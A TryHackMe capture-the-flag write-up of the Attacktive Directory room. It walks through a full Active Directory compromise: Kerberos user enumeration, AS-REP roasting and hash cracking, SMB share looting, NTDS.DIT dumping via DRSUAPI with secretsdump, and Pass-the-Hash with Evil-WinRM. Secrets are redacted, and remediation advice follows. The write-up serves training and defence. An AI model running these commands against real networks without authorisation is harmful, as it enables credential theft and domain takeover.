# Attacktive Directory Challenge

![Banner](./../IMAGES/attacktive_directory_img.png?raw=true)

**Category:** *Standalone Challenge* | **Section:** *TryHackMe Challenges* | **Challenge:** *[Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)*

> [!IMPORTANT]
>
> **Working writeup notice:** This was a working and verified writeup at the time of writing on **26 July 2026**.
>
> **Spoiler warning:** This writeup documents the full attack chain. Credentials, account names, hashes, sensitive challenge values and exact flag codes have been redacted.
>
> **Please note:** The target IP address was dynamically allocated by TryHackMe. The assessment was performed from my own Kali Linux VM using OpenVPN to connect to the TryHackMe VPN.
>
> The following placeholders are used throughout:
>
> - `<TARGET_IP>` represents the IP address allocated to the target machine.
> - `<TUN0_IP>` represents the IP address assigned to the Kali Linux `tun0` interface.
> - `<REDACTED>` represents credentials, account names, hashes, sensitive file contents, challenge-specific values or other direct giveaways.
> - `THM{....}` represents a redacted TryHackMe flag.
>
> **License:** Unless otherwise stated, all writeups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).

## About TryHackMe

This writeup was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation, Active Directory and defensive security.

## Lab Summary

Attacktive Directory is a Windows Active Directory challenge centred on enumerating and compromising a vulnerable Domain Controller.

The objective was to identify the domain, enumerate valid users through Kerberos, recover an AS-REP hash, crack the associated password, inspect accessible SMB shares, recover a second set of credentials, abuse directory replication privileges and authenticate as the Domain Administrator using an NTLM hash.

The successful attack chain involved:

1. Confirming VPN connectivity, routing and local hostname resolution.
2. Enumerating the Domain Controller with RustScan, Nmap and Enum4linux.
3. Identifying the NetBIOS domain and the Active Directory DNS domain.
4. Enumerating valid usernames with Kerbrute.
5. Identifying an account that did not require Kerberos pre-authentication.
6. Requesting and cracking a Kerberos AS-REP hash.
7. Authenticating to SMB and listing the available shares.
8. Downloading and decoding a Base64-encoded credential file.
9. Using the recovered backup account to request NTDS.DIT secrets through DRSUAPI.
10. Extracting the Administrator NTLM hash.
11. Performing Pass-the-Hash authentication with Evil-WinRM.
12. Reading the three user flags in the order they were collected.

Confirmed lab details used during the walkthrough:

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK/
Local hostname: spookysec.thm
```

The target was added to the Kali VM's local hosts file:

```bash
echo "<TARGET_IP> spookysec.thm" | sudo tee -a /etc/hosts
```

The mapping was confirmed with:

```bash
getent hosts spookysec.thm
```

VPN routing and the tunnel address were also verified:

```bash
ip route get <TARGET_IP>
ip -br address show tun0
```

The expected result showed traffic leaving through `tun0` and using `<TUN0_IP>` as the source address:

```text
<TARGET_IP> via <REDACTED> dev tun0 src <TUN0_IP>
```

This confirmed that traffic to the target was routed through `tun0` using `<TUN0_IP>`.

> [!TIP]
>
> When using your own Kali Linux VM, `/etc/hosts` is especially important during TryHackMe challenges. Some rooms depend on hostname-based routing, redirects, certificates, virtual hosts, cookies or application logic that may not work correctly when the expected hostname is missing.
>
> Over time, `/etc/hosts` can become cluttered with entries left behind by previous rooms. It is advantageous to keep it clear, tidy and focused on the challenge currently being worked on.
>
> A crowded hosts file eventually becomes DNS spaghetti - technically functional, but increasingly difficult to trust.

The file can be reviewed with:

```bash
cat /etc/hosts
```

An old entry for this room can be removed with:

```bash
sudo sed -i '/spookysec\.thm/d' /etc/hosts
```

The currently allocated target can then be added again using `<TARGET_IP>`.

## Tools Used

The principal tools and utilities used during the challenge were:

- `ip`, `getent` and `ping` for connectivity, routing and hostname validation.
- RustScan and Nmap for rapid port discovery, service detection and default script enumeration.
- Enum4linux for SMB and NetBIOS domain enumeration.
- Kerbrute for Kerberos username enumeration.
- Impacket `GetNPUsers` for requesting AS-REP data.
- Hashcat for cracking the Kerberos AS-REP hash.
- `smbclient` for listing and accessing SMB shares.
- `base64` for decoding the recovered credential file.
- Impacket `secretsdump` for obtaining directory secrets through DRSUAPI.
- Evil-WinRM for Pass-the-Hash authentication and remote PowerShell access.
- Standard Linux and PowerShell utilities such as `cat`, `ls`, `type` and `Get-ChildItem`.

Click [HERE](https://github.com/Valikahn/TryHackMe-Standalone-Challenge#tools-commonly-used) to return to the repository README. The `Tools Commonly Used` section contains links to tools used throughout the pathway.

## Initial Enumeration

### Port and Service Discovery

A rapid scan was performed with RustScan:

```bash
rustscan -a spookysec.thm --ulimit 5000 -- -sC -sV -Pn
```

Nmap was then used to confirm the principal services:

```bash
nmap -sC -sV -Pn spookysec.thm
```

A more focused aggressive scan was also performed:

```bash
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985 \
  -A -T4 spookysec.thm
```

The most relevant exposed services were:

```text
53/tcp    DNS
80/tcp    Microsoft IIS
88/tcp    Kerberos
135/tcp   Microsoft RPC
139/tcp   NetBIOS
389/tcp   LDAP
445/tcp   SMB
464/tcp   Kerberos password change
593/tcp   RPC over HTTP
3268/tcp  Global Catalog LDAP
3389/tcp  RDP
5985/tcp  WinRM
```

LDAP and RDP enumeration confirmed that the host was a Windows Active Directory Domain Controller. Challenge-specific domain and computer names are intentionally redacted.

### SMB and NetBIOS Enumeration

Enum4linux was used against ports 139 and 445:

```bash
cd /tmp/VK/ && enum4linux -a spookysec.thm | tee enum4linux.txt
```

The scan recovered the NetBIOS domain name:

```text
Domain Name: <REDACTED>
Domain Sid: <REDACTED>
```

This answered the first enumeration questions in the order they were discovered:

```text
1. SMB/NetBIOS enumeration tool: enum4linux
2. NetBIOS domain name: <REDACTED>
3. Commonly used invalid Active Directory TLD: .local
```

Some anonymous enumeration checks returned `NT_STATUS_ACCESS_DENIED`. This did not prevent the domain SID and NetBIOS domain from being recovered.

### Kerberos Username Enumeration

The room-specific username list was stored in the working directory:

```bash
ls -lah /tmp/VK/
```

Kerbrute was then used to enumerate valid usernames:

```bash
kerbrute userenum \
  --dc spookysec.thm \
  -d <REDACTED>.local \
  /tmp/VK/userlist.txt
```

The command used by Kerbrute for username discovery was:

```text
userenum
```

Several valid users were identified. Two notable accounts stood out because their names suggested service and backup-related functions:

```text
4. Kerbrute username command: userenum
5. First notable account: <REDACTED>
6. Second notable account: <REDACTED>
```

Usernames are case-insensitive in Active Directory, so duplicate results with different capitalisation did not represent separate accounts.

## Exploits

### AS-REP Roasting

> [!NOTE]
> If userlist.txt is not already present in /tmp/VK/, download the room-specific username list from GitHub before continuing:
```bash
wget -O /tmp/VK/userlist.txt https://raw.githubusercontent.com/Valikahn/TryHackMe-Standalone-Challenge/main/FILES/userlist.txt
```

The enumerated user list was supplied to Impacket `GetNPUsers`:

```bash
impacket-GetNPUsers \
  <REDACTED>.local/ \
  -dc-ip <TARGET_IP> \
  -usersfile /tmp/VK/userlist.txt \
  -format hashcat \
  -outputfile /tmp/VK/asrep.hash
```

One account returned an AS-REP response without requiring a password:

```text
$krb5asrep$23$<REDACTED>@<REDACTED>.LOCAL:<REDACTED>
```

This showed that Kerberos pre-authentication was disabled for that account.

The answers discovered at this stage were:

```text
7. Account queryable without a password: <REDACTED>
8. Hash type: Kerberos 5, etype 23, AS-REP
9. Hashcat mode: 18200
```

### Cracking the AS-REP Hash

The hash was checked locally:

```bash
cat /tmp/VK/asrep.hash
```

> [!NOTE]
> If passwordlist.txt is not already present in /tmp/VK/, download the room-specific password list from GitHub before continuing:
```bash
wget -O /tmp/VK/passwordlist.txt https://raw.githubusercontent.com/Valikahn/TryHackMe-Standalone-Challenge/main/FILES/passwordlist.txt
```

Hashcat was then used with the room's modified password list:

```bash
hashcat -m 18200 \
  /tmp/VK/asrep.hash \
  /tmp/VK/passwordlist.txt
```

The recovered result was displayed with:

```bash
hashcat -m 18200 /tmp/VK/asrep.hash --show
```

The password and complete credential pair are intentionally omitted:

```text
10. Recovered password: <REDACTED>
Credential pair: <REDACTED>:<REDACTED>
```

### SMB Share Enumeration

The recovered domain credential was used with `smbclient`:

```bash
smbclient -L //spookysec.thm \
  -U '<REDACTED>.local/<REDACTED>%<REDACTED>'
```

The utility and option answers were:

```text
11. Utility used to map remote SMB shares: smbclient
12. Option used to list shares: -L
```

The server listed six remote shares:

```text
13. Number of shares: 6
```

The share names included standard administrative and domain shares, along with one challenge-specific share that was accessible with the compromised account. Its name is intentionally redacted:

```text
14. Accessible share containing the text file: <REDACTED>
```

The SMB1 workgroup lookup failed after the SMB2 share listing completed. This did not affect the successful enumeration.

### Recovering the Shared Credential File

The accessible share was opened with:

```bash
smbclient //spookysec.thm/<REDACTED> \
  -U '<REDACTED>.local/<REDACTED>%<REDACTED>'
```

Inside the SMB client, the files were listed and the credential file was downloaded:

```text
ls
get <REDACTED>.txt
```

The downloaded file contained a Base64-encoded value:

```text
15. Encoded file content: <REDACTED>
```

The file was decoded locally with:

```bash
base64 -d /tmp/VK/<REDACTED>.txt
```

The decoded output followed the format:

```text
<REDACTED>@<REDACTED>.local:<REDACTED>
```

The full decoded content is intentionally withheld:

```text
16. Decoded file content: <REDACTED>
```

This decoding step was important because it converted the recovered Base64 text into a usable domain username and password.

### DRSUAPI Directory Replication

The recovered backup credential was used with Impacket `secretsdump`:

```bash
impacket-secretsdump \
  '<REDACTED>.local/<REDACTED>:<REDACTED>@<TARGET_IP>' \
  -just-dc
```

The output explicitly identified the method used:

```text
[*] Using the DRSUAPI method to get NTDS.DIT secrets
```

The expected room answer was therefore:

```text
17. Method used to dump NTDS.DIT: DRSUAPI
```

This distinction matters... DCSync describes the broader replication attack technique, while DRSUAPI is the specific method reported by `secretsdump` and expected by the challenge.

The dump returned domain account records in the following structure:

```text
domain\user:RID:LM_HASH:NTLM_HASH:::
```

The Administrator entry was recovered, but its hash has been redacted:

```text
Administrator:500:<REDACTED>:<REDACTED>:::
```

```text
18. Administrator NTLM hash: <REDACTED>
```

### Pass-the-Hash with Evil-WinRM

The Administrator password did not need to be cracked. The NTLM hash could be used directly through a Pass-the-Hash attack:

```text
19. Authentication method: Pass the Hash
20. Evil-WinRM hash option: -H
```

The Evil-WinRM connection was established with:

```bash
evil-winrm \
  -i <TARGET_IP> \
  -u Administrator \
  -H <REDACTED>
```

A successful connection returned an interactive PowerShell prompt:

```text
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

### Flag Collection

The flags are recorded below in the same order in which they were actually collected during the lab.

#### Administrator Flag - Discovered First

The Administrator flag was read from the desktop:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

```text
23. Administrator: THM{....}
```

#### Service Account Flag - Discovered Second

The initially expected filename did not exist:

```powershell
type C:\Users\<REDACTED>\Desktop\user.txt
```

PowerShell returned a path-not-found error. The desktop was therefore listed to identify the exact filename:

```powershell
Get-ChildItem C:\Users\<REDACTED>\Desktop
```

The flag file used a duplicated `.txt` extension:

```powershell
type C:\Users\<REDACTED>\Desktop\user.txt.txt
```

```text
21. Service account: THM{....}
```

#### Backup Account Flag - Discovered Third

The backup user's flag was read from its desktop:

```powershell
type C:\Users\<REDACTED>\Desktop\PrivEsc.txt
```

```text
22. Backup account: THM{....}
```

Although the room numbers the flags as Questions 21, 22 and 23, the actual collection order was Administrator, service account and then backup account.

## Full Attack Chain Recap

### 1. VPN and Hostname Preparation
The allocated target and `tun0` addresses were confirmed before scanning. The room hostname `spookysec.thm` was mapped to `<TARGET_IP>` in `/etc/hosts`, ensuring that the target resolved consistently from the Kali Linux VM.

### 2. Service Discovery
RustScan and Nmap identified the target as a Windows Active Directory Domain Controller exposing DNS, Kerberos, RPC, NetBIOS, LDAP, SMB, RDP and WinRM.

### 3. SMB and Domain Enumeration
Enum4linux was used to enumerate ports 139 and 445. Although several anonymous queries were denied, the NetBIOS domain name and domain SID were successfully recovered.

### 4. Kerberos Username Enumeration
Kerbrute's `userenum` command was supplied with the room-specific username list. Several valid domain users were identified, including two notable accounts whose names suggested service and backup functions.

### 5. AS-REP Roasting
Impacket `GetNPUsers` was used to query the Key Distribution Centre with the enumerated usernames. One account did not require Kerberos pre-authentication and returned a Kerberos 5 etype 23 AS-REP hash.

### 6. Password Recovery
The AS-REP hash was cracked with Hashcat mode `18200` and the room-specific password list. This recovered the plaintext password for the vulnerable account:

```text
<REDACTED>:<REDACTED>
```

### 7. SMB Share Access
The recovered credential was used with `smbclient -L` to list the remote SMB shares. Six shares were exposed, including one challenge-specific share that the compromised account could access.

### 8. Encoded Credential Discovery
The accessible SMB share contained a text file holding a Base64-encoded value. The file was downloaded and decoded locally:

```bash
base64 -d /tmp/VK/<REDACTED>.txt
```

The decoded content revealed a second domain username and password:

```text
<REDACTED>@<REDACTED>.local:<REDACTED>
```

### 9. Directory Replication Abuse
The recovered backup credential was supplied to Impacket `secretsdump` with `-just-dc`. The tool used the DRSUAPI method to retrieve NTDS.DIT secrets from the Domain Controller.

### 10. Administrator Hash Recovery
The directory dump exposed the Administrator NTLM hash. The hash is intentionally omitted from this public write-up:

```text
Administrator:500:<REDACTED>:<REDACTED>:::
```

### 11. Pass-the-Hash Authentication
The Administrator password did not need to be recovered. Evil-WinRM accepted the NTLM hash through the `-H` option, allowing Pass-the-Hash authentication to the WinRM service on `<TARGET_IP>`.

### 12. Administrator Flag
The first flag collected during the remote administrative session was read from the Administrator desktop:

```text
THM{....}
```

### 13. Service Account Flag
The initially expected filename did not exist, so the service account's desktop was listed with PowerShell. This revealed that the flag file used a duplicated `.txt` extension. The second collected flag was:

```text
THM{....}
```

### 14. Backup Account Flag
The final collected flag was read from the backup account's desktop:

```text
THM{....}
```

### 15. Final Objective
The recovered Administrator hash provided full administrative access to the Domain Controller. All three account flags were obtained, completing the room.

## Key Lessons

Attacktive Directory demonstrated several useful penetration-testing and defensive-security lessons:

- Confirm VPN routing and hostname resolution before troubleshooting higher-level services.
- Keep `/etc/hosts` tidy when using a personal Kali Linux VM for TryHackMe rooms.
- Active Directory enumeration requires several tools because no single protocol exposes the complete environment.
- Enum4linux can still recover useful domain information even when anonymous SMB queries are partially restricted.
- Kerberos username enumeration can identify valid accounts without attempting password authentication.
- Accounts configured without Kerberos pre-authentication are vulnerable to AS-REP roasting.
- Service and backup account names can indicate which users deserve closer investigation.
- Password hashes recovered from authentication protocols should be protected as sensitive credential material.
- Base64 is an encoding format and provides no confidentiality.
- Accessible SMB shares must be checked for configuration files, backups and stored credentials.
- Credential reuse and exposed secrets can turn a limited account compromise into a domain-level breach.
- Directory replication rights are highly privileged and can permit the recovery of domain password hashes.
- DRSUAPI was the specific NTDS.DIT dumping method reported by `secretsdump`.
- NTLM hashes can sometimes be used directly through Pass-the-Hash without recovering the plaintext password.
- WinRM provides a stable administrative shell when valid credentials or suitable NTLM material are available.
- File and directory contents should be enumerated rather than relying on assumed filenames.
- Public write-ups should explain the method without publishing passwords, hashes or exact flag values.

The most important lesson was that the compromise depended on several individually serious weaknesses being chained together. A Kerberos configuration error exposed one account, weak SMB access disclosed another credential, excessive replication rights revealed domain hashes, and NTLM authentication allowed the Administrator hash to be used directly.

## Remediation Notes

### Kerberos Account Security

- Require Kerberos pre-authentication for all standard user and service accounts.
- Regularly audit Active Directory for accounts configured with `DONT_REQ_PREAUTH`.
- Remove the setting unless there is a documented and unavoidable operational requirement.
- Use long, randomly generated passwords for service accounts.
- Prefer Group Managed Service Accounts where supported.
- Restrict interactive logon for service accounts unless it is explicitly required.
- Monitor for unusual volumes of AS-REP requests.

### Username and Authentication Exposure

- Avoid exposing unnecessary domain information to unauthenticated clients.
- Monitor repeated Kerberos requests across large username lists.
- Apply account lockout and authentication monitoring policies carefully without relying on lockout alone.
- Alert on unusual authentication failures followed by successful access from the same source.
- Review legacy authentication protocols and disable those that are no longer required.

### SMB Share Security

- Apply least privilege to both SMB share permissions and underlying NTFS permissions.
- Remove access for accounts that do not require the share for their role.
- Do not store credentials, password files or sensitive configuration in shared directories.
- Review administrative, backup and deployment shares regularly.
- Enable SMB signing and restrict SMB access to trusted networks.
- Monitor access to unusual or sensitive shares.
- Remove obsolete shares and stale files.

### Credential Storage

- Never treat Base64 encoding as a security control.
- Do not store plaintext or reversibly encoded credentials in text files.
- Use an approved secrets-management platform for service and backup credentials.
- Apply access logging and regular secret rotation.
- Prevent credential reuse between service, backup and administrative accounts.
- Rotate credentials immediately when they are found in shared files or backups.

### Directory Replication Permissions

- Restrict `DS-Replication-Get-Changes`, `DS-Replication-Get-Changes-All` and related permissions to authorised Domain Controllers and approved administrative principals.
- Audit all users, groups and service accounts with directory replication rights.
- Remove replication permissions from backup accounts unless they are strictly required.
- Use separate accounts for backup operations and directory administration.
- Alert on DRSUAPI replication requests originating from non-Domain Controllers.
- Review delegated Active Directory permissions regularly.

### NTLM and Pass-the-Hash Protection

- Prefer Kerberos authentication wherever possible.
- Restrict or disable NTLM where operationally feasible.
- Use Windows Defender Credential Guard on supported systems.
- Apply Local Administrator Password Solution controls to local administrative accounts.
- Prevent administrative account reuse across workstations and servers.
- Use dedicated privileged access workstations for domain administration.
- Monitor for anomalous NTLM authentication and Pass-the-Hash indicators.

### WinRM and Administrative Access

- Restrict WinRM to trusted management networks and approved administrative hosts.
- Apply host firewalls and network segmentation.
- Require strong authentication and least-privilege role assignments.
- Avoid using highly privileged accounts for routine administration.
- Monitor remote PowerShell sessions and unusual WinRM logons.
- Log access to user profile directories and sensitive administrative paths.

### Operational Hygiene

- Keep `/etc/hosts` limited to mappings required for the active room.
- Remove stale TryHackMe entries after each challenge.
- Record the target IP, hostname and `tun0` address before beginning enumeration.
- Maintain separate working directories for scan output, downloaded files and evidence.
- Validate each stage of the attack chain before moving to the next.
- Redact live credentials, hashes and flags before publishing documentation.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
